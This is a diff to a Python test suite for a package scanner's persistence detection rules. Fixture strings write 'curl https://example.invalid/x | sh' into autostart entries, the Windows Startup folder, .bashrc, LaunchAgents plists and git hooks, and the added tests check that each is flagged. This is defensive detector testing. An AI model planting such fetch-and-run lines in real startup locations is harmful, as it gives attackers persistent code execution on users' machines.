@@ -239,7 +239,7 @@ target = Path.home() / '.config/autostart/update.desktop'
 target.write_text('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
 """,
         "active.sh": (
-            "printf '%s' '[Desktop Entry]\\nExec=sh -c \"curl "
+            "printf '%b' '[Desktop Entry]\\nExec=sh -c \"curl "
             "https://example.invalid/x | sh\"' > ~/.config/autostart/update.desktop\n"
         ),
         "benign.py": """\
@@ -329,6 +329,34 @@ startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/S
     }
     findings = _opengrep(make_package, files)
     assert [finding.path for finding in findings] == ["active.py"]
+
+
+def test_assigned_python_startup_target_is_detected(make_package):
+    source = """\
+from pathlib import Path
+startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+target = startup / 'worker.py'
+target.write_text('import os; os.system("curl https://example.invalid/x | sh")')
+"""
+    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"worker.py": source}))
+
+
+def test_quoted_expanded_xdg_destination_is_detected(make_package):
+    source = ("printf '%b' '[Desktop Entry]\\nExec=curl https://example.invalid/x | sh' "
+              '> "$HOME/.config/autostart/update.desktop"\n')
+    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"xdg.sh": source}))
+
+
+def test_quoted_expanded_shell_startup_destinations_are_detected(make_package):
+    files = {
+        "rc.sh": "echo 'curl https://example.invalid/x | sh' >> \"$HOME/.bashrc\"\n",
+        "launchd.sh": (
+            "printf '%s' '<key>Program</key>curl https://example.invalid/x | sh' "
+            '> "$HOME/Library/LaunchAgents/demo.plist"\n'
+        ),
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings} == set(files)
 
 
 def test_vim_configuration_needs_vim_execution_semantics(make_package):
@@ -443,11 +471,11 @@ Path('/etc/cron.d/backup').write_text('0 2 * * * /usr/bin/backup')
 def test_literal_persistence_paths_support_open_kwargs_and_write_modes(make_package):
     files = {
         "git.py": """\
-with open('.git/hooks/pre-commit', 'wb+', encoding='utf-8') as handle:
+with open('.git/hooks/pre-commit', 'w+', encoding='utf-8') as handle:
     handle.write('curl https://example.invalid/x | sh')
 """,
         "xdg.py": """\
-with open('.config/autostart/update.desktop', 'a+b', encoding='utf-8') as handle:
+with open('.config/autostart/update.desktop', 'a+', encoding='utf-8') as handle:
     handle.write('[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
 """,
     }
